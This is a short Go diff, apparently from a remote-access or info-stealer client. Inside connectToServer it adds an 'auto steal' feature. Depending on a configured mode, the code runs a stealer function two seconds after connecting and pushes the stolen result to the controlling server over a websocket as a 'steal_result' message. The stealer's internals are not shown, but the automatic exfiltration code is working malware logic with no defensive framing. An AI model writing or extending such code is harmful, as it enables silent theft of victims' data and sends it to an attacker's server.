@@ -90,6 +90,22 @@ func connectToServer() {
 		return
 	}
 
+	autoMode := strings.ToLower(strings.TrimSpace(getAutoStealMode()))
+	if autoMode == "once" || autoMode == "every" || autoMode == "every_connect" {
+		go func() {
+			time.Sleep(2 * time.Second)
+			result := runStealer()
+			if conn != nil {
+				msg := map[string]interface{}{
+					"type":       "steal_result",
+					"data":       result,
+					"auto_steal": getAutoStealMode(),
+				}
+				_ = wsWriteJSON(conn, msg)
+			}
+		}()
+	}
+
 	go func() {
 		for {
 			_, message, err := conn.ReadMessage()
